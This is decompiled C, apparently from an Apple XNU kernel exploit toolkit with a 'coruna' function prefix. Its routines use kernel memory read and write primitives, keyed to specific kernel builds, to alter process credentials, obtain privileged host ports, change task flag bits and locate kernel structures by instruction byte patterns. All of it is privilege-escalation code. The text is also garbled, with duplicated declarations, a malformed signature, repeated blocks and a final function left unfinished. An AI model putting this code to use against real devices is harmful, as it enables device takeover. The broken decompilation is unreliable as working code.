void coruna_task_info_2ed58(long handle,uint64_t val,int flags,uint64_t id_2,unsigned long arg)
{
  kern_return_t lk1;
  int err;
  long handle;
  uint64_t u;
  task_flavor_t flavor;
  unsigned long size;
  uint version;
  mach_msg_type_number_t scratch;
  uint8_t bootargs[32];
  uint64_t thread_attr[4];
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) goto fail;
    if (err == 0x1809) {
      version = 0xa0;
      if (flags - 1U < 2) {
      scratch = 2;
      flavor = 0xd;
      err = 8;
      }
      else {
      if (flags != 3) {
      return 0;
      }
      version = version + 8;
      scratch = 8;
      flavor = 0xf;
      err = 0x20;
      }
      if (err == (int)arg) {
      lk1 = _task_info((task_name_t)val,flavor,(task_info_t)thread_attr,&scratch);
      if (lk1 == 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      handle = coruna_kernel600c_via_return_zero_28118(handle,val);
      if (handle == 0) {
      return 0;
      }
      }
      else {
      handle = coruna_return_zero_29df0();
      if (handle == 0) {
      return 0;
      }
      }
      handle = handle + (unsigned long)version;
      u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle,arg & 0xffffffff,bootargs);
      if ((int)u == 0) {
      return u;
      }
      err = _memcmp(bootargs,thread_attr,arg & 0xffffffff);
      if (err == 0) {
      if (((*(long *)(&k_kernel_slot_1900 + handle) == 0) && (flags == 2)) &&
      (*(task_name_t *)k_kernel_mach_task_self_slot == (task_name_t)val)) {
      *(uint64_t *)(&k_kernel_slot_1908 + handle) = thread_attr[0];
      *(long *)(&k_kernel_slot_1900 + handle) = handle;
      }
      u = coruna_kernel600c_via_vm_deallocate(handle,handle,id_2,arg);
      return u;
      }
      }
      }
      return 0;
    }
    if (err != 0x1c1b) {
      return 0;
    }
    version = 0x94;
    size = 0x1c1b19145fffff;
  }
  else {
    if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
      return 0;
    }
fail:
    version = 0x40;
    size = 0x1f530f027fffff;
  }
  if (*(unsigned long *)(handle + 0x158) <= size) {
    version = 0x9c;
  }
done:
  if (flags - 1U < 2) {
    scratch = 2;
    flavor = 0xd;
    err = 8;
  }
  else {
    if (flags != 3) {
      return 0;
    }
    version = version + 8;
    scratch = 8;
    flavor = 0xf;
    err = 0x20;
  }
  if (err == (int)arg) {
    lk1 = _task_info((task_name_t)val,flavor,(task_info_t)thread_attr,&scratch);
    if (lk1 == 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        handle = coruna_kernel600c_via_return_zero_28118(handle,val);
        if (handle == 0) {
          return 0;
        }
      }
      else {
        handle = coruna_return_zero_29df0();
        if (handle == 0) {
          return 0;
        }
      }
      handle = handle + (unsigned long)version;
      u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle,arg & 0xffffffff,bootargs);
      if ((int)u == 0) {
        return u;
      }
      err = _memcmp(bootargs,thread_attr,arg & 0xffffffff);
      if (err == 0) {
        if (((*(long *)(&k_kernel_slot_1900 + handle) == 0) && (flags == 2)) &&
           (*(task_name_t *)k_kernel_mach_task_self_slot == (task_name_t)val)) {
          *(uint64_t *)(&k_kernel_slot_1908 + handle) = thread_attr[0];
          *(long *)(&k_kernel_slot_1900 + handle) = handle;
        }
        u = coruna_kernel600c_via_vm_deallocate(handle,handle,id_2,arg);
        return u;
      }
    }
  }
  return 0;
}





uint coruna_pthread_attr_setdetachstate_2ef40(long handle,uint64_t *val,uint64_t id_2,void *ctx)
{
  uint u;
  mach_port_t target_act;
  int err;
  uint size;
  void **lppv4;
  pthread_t scratch;
  pthread_attr_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = (pthread_t)0x0;
  u = _pthread_attr_init(&bootargs);
  if (u != 0) {
    size = -u;
    if (-1 < (int)u) {
      size = u;
    }
    size = size | 0x40000000;
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
    }
    ___stack_chk_fail(u);
  }
  u = _pthread_attr_setdetachstate(&bootargs,1);
  if (u == 0) {
    lppv4 = (void **)coruna_fn_ptr_cast(id_2);
    u = _pthread_create_suspended_np(&scratch,&bootargs,lppv4,ctx);
    size = -u;
    if (-1 < (int)u) {
    size = u;
    }
    size = size | 0x40000000;
    }
    u = _pthread_attr_destroy(&bootargs);
    fail:
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
  }
  else {
done:
    size = -u;
    if (-1 < (int)u) {
      size = u;
    }
    size = size | 0x40000000;
  }
  u = _pthread_attr_destroy(&bootargs);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_kernel600c_via_return_zero_344e0(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  uint32_t size;
  uint8_t scratch[8];
  
  size = 0x4000000;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    size = 1;
  }
  if ((int)val != 0) {
    handle = coruna_kernel600c_via_return_zero_29714(handle,val,0);
    u = 0;
    if (handle != 0) {
      addr = coruna_return_zero_29948(handle,id_2);
      u = 0;
      if (((addr != 0) && (u = coruna_kernel600c_residual_228(handle,addr,scratch), (int)u != 0)) &&
         (u = coruna_return_zero_344e0(handle,id_2,size,1), (int)u != 0)) {
        coruna_kernel600c_via_return_zero_2b4e0(handle,handle);
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          u = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,addr,handle);
          err = (int)u;
        }
        else {
          u = coruna_kernel600c_via_mach_vm_machine_attribute_1e63c();
          err = (int)u;
        }
        if (err != 0) {
          u = 1;
        }
      }
    }
    return u;
  }
  u = coruna_return_zero_344e0(handle,id_2,size,0);
  return u;
}





bool coruna_pthread_join_2f17c(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint u;
  int err;
  pthread_t scratch;
  
  scratch = (pthread_t)0x0;
  u = coruna_pthread_attr_setdetachstate_2ef40(val,&scratch,id_2,size_3);
  if (u == 0) {
    err = _pthread_join(scratch,(void **)0x0);
    u = (uint)(err != 0);
  }
  return u == 0;
}





uint64_t coruna_getuid(long handle,uint size,int flags,int count_2)
{
  uint8_t *ptr;
  uid_t u;
  int err;
  long handle;
  uint64_t size;
  uint scratch;
  uint scratch;
  uint bootargs;
  uint32_t thread_attr;
  int bootargs;
  uint32_t host_info;
  uint64_t serial_buf;
  uint64_t thread_attr;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t sa_saved;
  int serial_buf;
  int action;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint32_t path_buf;
  uint64_t stack_guard;
  uint32_t tmp_buf;
  uint64_t region;
  uint64_t sa_saved;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t sa_new;
  uint64_t frame;
  int path_buf;
  uint8_t tmp_buf[28];
  uint region;
  long plist;
  long url_buf;
  long json_buf;
  unsigned long frame;
  
  u = _getuid();
  ptr = k_kernel_mach_task_self_slot;
  handle = coruna_kernel600c_via_return_zero_29714(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0);
  if (handle == 0) {
    return 0;
  }
  size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + 0x68,4,&path_buf);
  if ((int)size == 0) {
    return size;
  }
  if ((*(int *)(&k_kernel_slot_1910 + handle) == 0) && (*(int *)(&k_kernel_slot_1914 + handle) == 0)) {
    *(uid_t *)(&k_kernel_slot_1910 + handle) = u;
    *(int *)(&k_kernel_slot_1914 + handle) = path_buf;
  }
  if ((u == size) && (path_buf == flags)) {
    return 1;
  }
  if (count_2 == 0) {
    err = coruna_ctx_test_flag(handle,4);
    if (err != 0) {
      return 0;
    }
    handle = *(long *)(&k_kernel_slot_18e0 + handle);
    size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + 0x18,0x58,&block_ctx);
    if ((int)size == 0) {
    return size;
    }
    serial_buf = region;
    action = plist;
    thread_attr = sa_saved;
    stack_guard = json_buf;
    block_ctx = url_buf;
    sa_saved = frame;
    host_info = sa_new;
    _local_160 = coruna_u64_pack((size), (size));
    _uStack_158 = coruna_u64_pack((path_buf), (size));
    _local_150 = coruna_u64_pack((tmp_buf), (flags));
    serial_buf = flags;
    action = flags;
    err = _memcmp(&scratch,&block_ctx,0x58);
    if ((err != 0) && (size = coruna_kernel600c_via_vm_deallocate(handle,handle + 0x18,&scratch,0x58), (int)size == 0))
    {
    return size;
    }
    frame = coruna_kernel600c_via_return_zero_28a34(handle,*(uint32_t *)ptr);
    if (frame != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
    handle = 0xb0;
    }
    else if (err == 0x1809) {
    handle = 200;
    }
    else {
    if (err != 0x1c1b) {
    return 0;
    }
    handle = 0xb8;
    }
    }
    else {
    if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
    return 0;
    }
    handle = 0xa8;
    }
    err = coruna_kernel600c_residual_228(handle,handle + frame,&frame);
    if (err != 0) {
    if (frame == 0) {
    err = coruna_ctx_test_flag(handle,0x5584001);
    if (err == 0) {
    handle = coruna_return_zero_15be8(handle,0);
    if (((handle != 0) &&
    (err = coruna_open_m2scaler_14cf0(handle,handle,size,1,0,0,&frame), err != 0)) &&
    (err = coruna_open_m2scaler_14cf0(handle,handle,u,0xffffffffffffffff,0,0,&frame), err != 0
    )) {
    return 1;
    }
    }
    else {
    handle = *(long *)(&k_kernel_slot_1990 + handle);
    if (handle == 0) {
    coruna_macho_text_sect(tmp_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    handle = coruna_strsep(tmp_buf,"00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52",0,1);
    if (handle == 0) {
    return 0;
    }
    handle = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + 4);
    if (handle == 0) {
    return 0;
    }
    *(long *)(&k_kernel_slot_1990 + handle) = handle;
    }
    err = coruna_kernel600c_residual_228(handle,handle,&frame);
    if (((err != 0) && (frame < 0x400)) &&
    ((err = coruna_kernel600c_residual_228(handle,handle + *(int *)(handle + 0x168),&json_buf), err != 0
    && (((handle = coruna_ptr_canonicalize(handle,json_buf), handle != 0 &&
    (err = coruna_kernel600c_residual_228(handle,json_buf +
    (frame & size) *
    (long)*(int *)(handle + 0x168),&url_buf),
    err != 0)) && (handle = coruna_ptr_canonicalize(handle,url_buf), handle != 0)))))) {
    while (err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,url_buf + (long)*(int *)(handle + 0x168) * 2,4,
    &region), err != 0) {
    if (region == size) {
    err = coruna_kernel600c_residual_228(handle,url_buf + (long)*(int *)(handle + 0x168) * 3,
    &plist);
    if (err == 0) {
    return 0;
    }
    plist = plist + 4;
    err = coruna_kernel600c_residual_229(handle,url_buf + (long)*(int *)(handle + 0x168) * 3);
    if (err == 0) {
    return 0;
    }
    {
    if (url_buf != 0) {
    return 1;
    }
    }
    }
    err = coruna_kernel600c_residual_228(handle,url_buf,&url_buf);
    if (err == 0) {
    return 0;
    }
    url_buf = coruna_ptr_canonicalize(handle,url_buf);
    if (url_buf == 0) {
    return 0;
    }
    }
    }
    }
    }
    else {
    url_buf = coruna_ptr_canonicalize(handle);
    joined_r0x0002f5e8:
    if (url_buf != 0) {
    return 1;
    }
    }
    }
    }
    return 0;
  }
  block_ctx = 0;
  handle = coruna_kernel600c_via_return_zero_29714(handle,*(uint32_t *)ptr,&block_ctx);
  if (handle == 0) {
    return 0;
  }
  if (*(long *)(&k_kernel_slot_18e0 + handle) == 0) {
    *(long *)(&k_kernel_slot_18e0 + handle) = handle;
    *(uint64_t *)(&k_kernel_slot_18e8 + handle) = block_ctx;
  }
fail:
  size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + 0x18,0x58,&block_ctx);
  if ((int)size == 0) {
    return size;
  }
  serial_buf = region;
  action = plist;
  thread_attr = sa_saved;
  stack_guard = json_buf;
  block_ctx = url_buf;
  sa_saved = frame;
  host_info = sa_new;
  _local_160 = coruna_u64_pack((size), (size));
  _uStack_158 = coruna_u64_pack((path_buf), (size));
  _local_150 = coruna_u64_pack((tmp_buf), (flags));
  serial_buf = flags;
  action = flags;
  err = _memcmp(&scratch,&block_ctx,0x58);
  if ((err != 0) && (size = coruna_kernel600c_via_vm_deallocate(handle,handle + 0x18,&scratch,0x58), (int)size == 0))
  {
    return size;
  }
  frame = coruna_kernel600c_via_return_zero_28a34(handle,*(uint32_t *)ptr);
  if (frame != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        handle = 0xb0;
      }
      else if (err == 0x1809) {
        handle = 200;
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        handle = 0xb8;
      }
    }
    else {
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return 0;
      }
      handle = 0xa8;
    }
    err = coruna_kernel600c_residual_228(handle,handle + frame,&frame);
    if (err != 0) {
      if (frame == 0) {
        err = coruna_ctx_test_flag(handle,0x5584001);
        if (err == 0) {
          handle = coruna_return_zero_15be8(handle,0);
          if (((handle != 0) &&
              (err = coruna_open_m2scaler_14cf0(handle,handle,size,1,0,0,&frame), err != 0)) &&
             (err = coruna_open_m2scaler_14cf0(handle,handle,u,0xffffffffffffffff,0,0,&frame), err != 0
             )) {
            return 1;
          }
        }
        else {
          handle = *(long *)(&k_kernel_slot_1990 + handle);
          if (handle == 0) {
            coruna_macho_text_sect(tmp_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
            handle = coruna_strsep(tmp_buf,"00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52",0,1);
            if (handle == 0) {
              return 0;
            }
            handle = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + 4);
            if (handle == 0) {
              return 0;
            }
            *(long *)(&k_kernel_slot_1990 + handle) = handle;
          }
          err = coruna_kernel600c_residual_228(handle,handle,&frame);
          if (((err != 0) && (frame < 0x400)) &&
             ((err = coruna_kernel600c_residual_228(handle,handle + *(int *)(handle + 0x168),&json_buf), err != 0
              && (((handle = coruna_ptr_canonicalize(handle,json_buf), handle != 0 &&
                   (err = coruna_kernel600c_residual_228(handle,json_buf +
                                                 (frame & size) *
                                                 (long)*(int *)(handle + 0x168),&url_buf),
                   err != 0)) && (handle = coruna_ptr_canonicalize(handle,url_buf), handle != 0)))))) {
            while (err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,url_buf + (long)*(int *)(handle + 0x168) * 2,4,
                                        &region), err != 0) {
              if (region == size) {
                err = coruna_kernel600c_residual_228(handle,url_buf + (long)*(int *)(handle + 0x168) * 3,
                                     &plist);
                if (err == 0) {
                  return 0;
                }
                plist = plist + 4;
                err = coruna_kernel600c_residual_229(handle,url_buf + (long)*(int *)(handle + 0x168) * 3);
                if (err == 0) {
                  return 0;
                }
                {
                  if (url_buf != 0) {
                  return 1;
                  }
                }
              }
              err = coruna_kernel600c_residual_228(handle,url_buf,&url_buf);
              if (err == 0) {
                return 0;
              }
              url_buf = coruna_ptr_canonicalize(handle,url_buf);
              if (url_buf == 0) {
                return 0;
              }
            }
          }
        }
      }
      else {
        url_buf = coruna_ptr_canonicalize(handle);
joined_r0x0002f5e8:
        if (url_buf != 0) {
          return 1;
        }
      }
    }
  }
  return 0;
}





unsigned long coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_4(uint64_t arg,uint64_t val,uint n,uint *m)

{
  int fd_11;
  unsigned long type_id_17;
  uint cache_81;
  
  type_id_17 = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,val,&cache_81);
  if ((int)type_id_17 != 0) {
    if (m != (uint *)0x0) {
      *m = cache_81 & 0x3ff;
    }
    cache_81 = cache_81 & 0xfffffc00 | n & 0x3ff;
    fd_11 = coruna_mach_vm_machine_attribute(arg,val);
    type_id_17 = (unsigned long)(fd_11 != 0);
  }
  return type_id_17;
}





unsigned long coruna_host_get_special_port(uint *arg)

{
  mach_port_t host_priv;
  kern_return_t lk1;
  int n;
  long serial_11;
  unsigned long size;
  uint32_t cache_91;
  uint cache_81;
  
  host_priv = _mach_host_self();
  if (1 < arg[0x648] + 1) {
    return (unsigned long)arg[0x648];
  }
  lk1 = _host_get_special_port(host_priv,-1,2,&cache_81);
  if (lk1 != 0) {
    size = *(unsigned long *)(arg + 0x56);
    if ((size < 0x1f530000000000) ||
       ((((*arg & 0x5584001) == 0 && (size < 0x22580a06c00000)) &&
        ((size < 0x1f543c40800000 || (0x2257 < (int)arg[0x50])))))) {
      serial_11 = coruna_ret_stub_2(arg,host_priv);
      if (serial_11 == 0) {
        return 0;
      }
      size = coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_4(arg,serial_11,4,&cache_91);
      if ((int)size == 0) {
        return size;
      }
      n = _host_get_special_port(host_priv,-1,2,&cache_81);
      coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_4(arg,serial_11,cache_91,0);
    }
    else {
      serial_11 = coruna_return_zero_2ac70(arg,2);
      if (serial_11 == 0) {
        return 0;
      }
      n = coruna_mach_port_request_notification(arg,serial_11,&cache_81);
    }
    if (n != 0) {
      return 0;
    }
  }
  return (unsigned long)cache_81;
}





uint coruna_kernel600c_via_return_zero_2ac70(long handle)
{
  int err;
  uint u;
  long handle;
  uint scratch;
  
  u = *(uint *)(&k_kernel_slot_1924 + handle);
  if (*(uint *)(&k_kernel_slot_1924 + handle) + 1 < 2) {
    handle = coruna_return_zero_2ac70(handle,0);
    u = 0;
    if ((handle != 0) &&
       (err = coruna_mach_port_request_notification(handle,handle,&scratch), u = scratch, err != 0)) {
      u = 0;
    }
  }
  return u;
}
uint64_t coruna_return_zero_2f808(long handle,uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  unsigned long *ptr;
  unsigned long scratch;
  unsigned long bootargs [4];
  long thread_attr;
  
  ptr = &scratch;
  err = coruna_ctx_test_flag(handle,0x20);
  if (err != 0) {
    handle = coruna_kernel600c_via_return_zero_293c0_2(handle,val);
    if (handle == 0) {
      return 0;
    }
    u = coruna_kernel600c_residual_228(handle,handle + 0xb0,&thread_attr);
    if ((int)u == 0) {
      return u;
    }
    handle = coruna_ptr_canonicalize(handle,thread_attr);
    if (handle == 0) {
      return 0;
    }
    u = coruna_kernel600c_residual_228(handle,thread_attr + 0x50,bootargs + 3);
    if ((int)u == 0) {
      return u;
    }
    if (((bootargs[3] != 0) && (handle = *(long *)(handle + 0x128), handle != 0)) &&
       (bootargs[3] != handle)) {
      bootargs[1] = 0;
      bootargs[2] = 0;
      scratch = 0;
      bootargs[0] = 0;
      err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + 0x28,8,bootargs);
      if (((err != 0) &&
          (err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,*(long *)(handle + 0x128) + 0x30,8,&scratch), err != 0))
         && ((err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,bootargs[3] + 0x28,8,bootargs + 2), err != 0 &&
             (err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,bootargs[3] + 0x30,8,bootargs + 1), err != 0)))) {
        if (bootargs[0] < bootargs[2]) {
          handle = bootargs[3] + 0x28;
          ptr = bootargs;
        }
        else {
          handle = bootargs[3] + 0x30;
        }
        err = coruna_return_zero_fc20(handle,handle,ptr,8);
        if (err != 0) {
          return 1;
        }
      }
      return 0;
    }
  }
  return 1;
}





uint64_t coruna_return_zero_2f954(long handle,uint64_t val,int flags)
{
  bool err;
  int err;
  uint64_t u;
  long handle;
  long addr;
  long scratch;
  unsigned long bootargs;
  uint thread_attr;
  
  thread_attr = 0;
  u = coruna_return_zero_23288();
  if ((int)u == 0) {
    return u;
  }
  if (flags == 0) {
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5184001);
      if (err != 0) {
        bootargs = 0;
        err = *(int *)(handle + 0x140);
        if (err < 0x2712) {
          if (0x1f52 < err) {
            err = coruna_ctx_test_flag(handle,0x1180000);
            err = err == 0;
            handle = 0xa0;
            addr = 0x98;
            if (!err) {
            addr = handle;
            }
            }
            handle = coruna_kernel600c_via_return_zero_293c0_2(handle,val);
            if (handle == 0) {
            return 0;
          }
          if (0x1c1a < err) {
            err = coruna_ctx_test_flag(handle,0x80000);
            err = err == 0;
            handle = 0xe0;
            addr = 0xd8;
            if (!err) {
            addr = handle;
            }
            }
            handle = coruna_kernel600c_via_return_zero_293c0_2(handle,val);
            if (handle == 0) {
            return 0;
          }
          addr = 0xe8;
          if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
            addr = 0xf0;
          }
        }
        else {
          err = coruna_ctx_test_flag(handle,0x1180000);
          err = err == 0;
          handle = 0xa8;
          addr = 0xa0;
fail:
          if (!err) {
            addr = handle;
          }
        }
        handle = coruna_kernel600c_via_return_zero_293c0_2(handle,val);
        if (handle == 0) {
          return 0;
        }
        handle = handle + addr;
        err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle,8,&bootargs);
        if (err == 0) {
          return 0;
        }
        if (bootargs != 0) {
          scratch = 0;
          if ((*(unsigned long *)k_kernel_vm_page_mask_slot & bootargs) != 0) {
            return 0;
          }
          err = coruna_return_zero_fc20(handle,handle,&scratch,8);
          if (err == 0) {
            return 0;
          }
          u = coruna_return_zero_fc20(handle,handle + 8,&scratch,8);
          if ((int)u == 0) {
            return u;
          }
        }
      }
    }
    else {
      addr = coruna_kernel600c_via_return_zero_293c0_2(handle,val);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel600c_residual_228(handle,addr + 0xb0,&bootargs);
      if (err == 0) {
        return 0;
      }
      addr = coruna_ptr_canonicalize(handle,bootargs);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel600c_residual_228(handle,bootargs + 0x50,&scratch);
      if (err == 0) {
        return 0;
      }
      if (scratch != 0) {
        *(long *)(handle + 0x128) = scratch;
        scratch = 0;
        err = coruna_return_zero_fc20(handle,bootargs + 0x50,&scratch,*(uint32_t *)(handle + 0x168));
        if (err == 0) {
          return 0;
        }
      }
    }
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    addr = 0x10c;
    if ((err != 0x1809) && (err != 0x1c1b)) {
      if (err != 0x1f53) {
        return 0;
      }
      addr = 0x11c;
    }
  }
  else {
    if (err < 0x225c) {
      if (err == 0x1f54) {
        addr = 0x94;
        handle = coruna_return_zero_293c0(handle,val);
        if (handle == 0) {
        return 0;
        }
        u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + addr,4,&thread_attr);
        if ((int)u != 0) {
        thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
        u = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + addr,&thread_attr,4);
        return u;
        }
        return u;
      }
      if (err != 0x2258) {
        return 0;
      }
    }
    else if (err != 0x225c) {
      if (err != 0x2712) {
        return 0;
      }
      addr = 200;
      handle = coruna_return_zero_293c0(handle,val);
      if (handle == 0) {
      return 0;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + addr,4,&thread_attr);
      if ((int)u != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      u = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + addr,&thread_attr,4);
      return u;
      }
      return u;
    }
    addr = 0xb4;
  }
done:
  handle = coruna_return_zero_293c0(handle,val);
  if (handle == 0) {
    return 0;
  }
  u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + addr,4,&thread_attr);
  if ((int)u != 0) {
    thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
    u = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + addr,&thread_attr,4);
    return u;
  }
  return u;
}





uint64_t coruna_return_zero_2fc50(long handle)
{
  uint u;
  int err;
  long handle;
  long addr;
  uint scratch;
  
  handle = coruna_kernel600c_via_return_zero_28a34();
  if (handle != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f54) {
      if (err == 0x1809) {
        addr = 0x3c0;
      }
      else if (err == 0x1c1b) {
        addr = 0x3a8;
      }
      else {
        if (err != 0x1f53) {
          return 0;
        }
        addr = 0x4d0;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x430;
        }
      }
    }
    else if (err < 0x225c) {
      if (err == 0x1f54) {
        addr = 0x4c8;
      }
      else {
        if (err != 0x2258) {
          return 0;
        }
        addr = 0x4ac;
      }
    }
    else {
      if ((err != 0x225c) && (err != 0x2712)) {
        return 0;
      }
      addr = 0x6a4;
    }
    err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr + handle,&scratch);
    if ((err != 0) && ((scratch & 0xff000000) == 0)) {
      u = scratch & 0xfff71fdf | 0x80000;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
        u = scratch | 0x20;
      }
      if ((scratch == (u & 0xffff1fff)) ||
         (scratch = u & 0xffff1fff, err = coruna_mach_vm_machine_attribute(handle,addr + handle), err != 0)) {
        return 1;
      }
    }
  }
  return 0;
}





uint64_t
void coruna_return_zero_2fdb4(long handle,uint64_t val,uint size,unsigned long arg,uint64_t id_2)
{
  uint u;
  bool err;
  int err;
  long handle;
  uint64_t size;
  long addr;
  long off;
  long base;
  uint version;
  uint port;
  uint tag;
  uint kind;
  void *ptr;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  uint64_t type_id_10;
  uint64_t type_id_11;
  long scratch;
  byte bootargs;
  uint8_t thread_attr;
  uint64_t host_info;
  long serial_buf [3];
  byte action;
  int block_ctx;
  byte stack_guard;
  uint64_t scratch;
  
  host_info = 0;
  handle = coruna_kernel600c_via_return_zero_293c0_2();
  if (handle == 0) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x20);
  kind = (uint)id_2;
  tag = (uint)arg;
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err == 0) {
      size = coruna_ctx_test_flag(handle,0x200);
      if ((int)size == 0) {
        return size;
      }
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err < 0x1f53) {
          if (err < 0x1c1b) {
            if (err < 0x1809) {
              return 0;
            }
            addr = 0xe7;
            if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
              addr = 0xef;
            }
          }
          else {
            addr = 0xdf;
          }
        }
        else {
          addr = 0x97;
        }
      }
      else {
        addr = 0x8f;
      }
      size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,addr + handle,1,(long)&host_info + 4);
      if ((int)size == 0) {
        return size;
      }
      host_info = coruna_u64_pack((host_info), (kind));
      if (host_info == kind) {
        return 1;
      }
      size = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,addr + handle,&host_info,1);
      err = (int)size;
      if (err != 0) {
      return 1;
      }
      return size;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2712) {
      if (0x2257 < err) {
        err = coruna_ctx_test_flag(handle,0x1180000);
        err = err == 0;
        off = 0xbf;
        addr = 0xb7;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      if (0x1f52 < err) {
        size = 0x180000;
        err = coruna_ctx_test_flag(handle,size);
        err = err == 0;
        off = 199;
        addr = 0xbf;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      if (0x1c1a < err) {
        err = coruna_ctx_test_flag(handle,0x80000);
        err = err == 0;
        off = 0x107;
        addr = 0xff;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      addr = 0x107;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        addr = 0x10f;
      }
    }
    else {
      size = 0x1180000;
done:
      err = coruna_ctx_test_flag(handle,size);
      err = err == 0;
      off = 199;
      addr = 0xbf;
fail:
      if (!err) {
        addr = off;
      }
    }
    size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,addr + handle,4,(long)&host_info + 4);
    if ((int)size == 0) {
      return size;
    }
    version = 0xff00;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b0a80100000) {
      version = 0xff000000;
    }
    port = 0x10000;
    u = 0x1000000;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b0a80100000) {
      port = 0x100;
      u = 0x10000;
    }
    if (tag == 0) {
      u = 0;
    }
    if (size == 0) {
      port = 0;
    }
    kind = u | port | kind | host_info & version;
    host_info = coruna_u64_pack((host_info), (kind));
    if ((host_info != kind) &&
       (size = coruna_return_zero_fc20(handle,addr + handle,&host_info,4), (int)size == 0)) {
      return size;
    }
    if (*(int *)(handle + 0x140) < 0x1f53) {
      arg = (unsigned long)(size ^ 1 | tag);
    }
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      size = coruna_kernel600c_via_wire_map_lookup(handle,val,arg,id_2);
      err = (int)size;
      {
        if (err == 0) {
        return size;
        }
      }
    }
  }
